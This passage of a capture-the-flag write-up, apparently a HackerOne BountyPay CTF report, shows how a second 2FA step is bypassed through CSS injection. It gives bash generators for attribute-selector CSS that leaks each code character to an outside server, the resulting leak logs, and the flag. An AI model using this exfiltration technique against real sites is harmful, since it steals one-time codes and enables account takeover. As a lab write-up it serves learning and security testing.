After clicking **Pay** button - we can notice that there's another 2FA system to bypass:

{F861705}

Clicking **Send Challenge** button cause another HTTP Request sent:

```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:77.0) Gecko/20100101 Firefox/77.0
(...)

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

There's *app_style* parameter contains URL to CSS style. After modifying it to own HTTP server we can see that requests are made by Headless Chrome:

```
3.21.98.146 - - [10/Jun/2020:06:31:10 +0200] "GET /test.css HTTP/1.1" 404 3797 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36"
```

Basing on tests - Headless Chrome visits website which generate 2FA token and we're able to control CSS style URL added to this page. We can try then to use [CSS Exfiltration](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d) technique to obtain 2FA code. 

First - we need to know what's attribute *name*, that we want to exfiltrate. To do it, I've generated such CSS file:

```
$ for a in {{a..z},{A..Z},{0..9},.,:,\;,-}; do echo "input[name^='$a] { background: url(https://[redacted]/csp/leak.gif?name=$a); }" ; done > h1.css
```

Then in logs I can find out that first letter of attribute is *c*

```
GET /csp/leak.gif?name=c HTTP/1.1
```

By using this technique I've found out that full attribute name is **code_X** - where X is number from **1** to **7**, which stands for each position of code. Positions are returned in random order each time, so to exfiltrate it properly, we need to know which letter is on which position. Final CSS generator looks like this:

```
#!/bin/bash
for i in `seq 1 7`; do
        for a in {{a..z},{A..Z},{0..9},.,:,\;,-,_}; do echo "input[name='code_$i'][value='$a'] { background: url(https://[redacted]/csp/leak.gif?pos=1&val=$a); }" ; done
done
``` 

After submitting - exfiltrated code shows in log and we can provide it in web application:

```
GET /csp/leak.gif?pos=1&val=g HTTP/1.1
GET /csp/leak.gif?pos=7&val=P HTTP/1.1
GET /csp/leak.gif?pos=5&val=K HTTP/1.1
GET /csp/leak.gif?pos=4&val=m HTTP/1.1
GET /csp/leak.gif?pos=6&val=2 HTTP/1.1
GET /csp/leak.gif?pos=2&val=e HTTP/1.1
GET /csp/leak.gif?pos=3&val=H HTTP/1.1
```

{F861745}

This leads to final point of CTF - the flag:

```
^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$
```

{F861746}

Supporting Material/References:
---------------------

All network traffic was performed from IPs: ███ and ████████

Used tools:
- Browsers: Google Chrome  83.0.4103.97 / Mozilla Firefox 77.0.1
- ffuf
- Burp Suite Professional
- Xiaomi Redmi 6A (Android 8.1.1)
- adb 
- Drozer 
- dex2jar , jd-gui
- Own custom bash scripts
- Couple of standard Linux tools like unzip / jar / host / telnet / curl / etc.

## Impact

Leaking sensitive flag and winning CTF ;-)

## Attachments
- crt.png
- app_bountypay_login_page.png
- github.png
- 2fa.png
- bountypay_dashboard.png
- api_mainpage.png
- software_401.png
- twitter2_-_follows.png
- twitter1_-_bountyhq.png
- twitter3_-_sandra.png
- staff_-_sandra.png
- staff_-_report.png
- staff_-_username.png
- staff_-_templates.png
- staff_-_sandra_-_profile.png
- tickets.png
- admin_privs.png
- payment.png
- 2fa_again.png
- 2fa_code.png
- flag.png
- android_main.png
- android_partone.png
- android_final.png
- android_partthree_1.png
- android_partthree_2_.png
- android_partthree_3.png
- android_parttwo_1.png
- android_parttwo_2.png
- android_parttwo_3.png
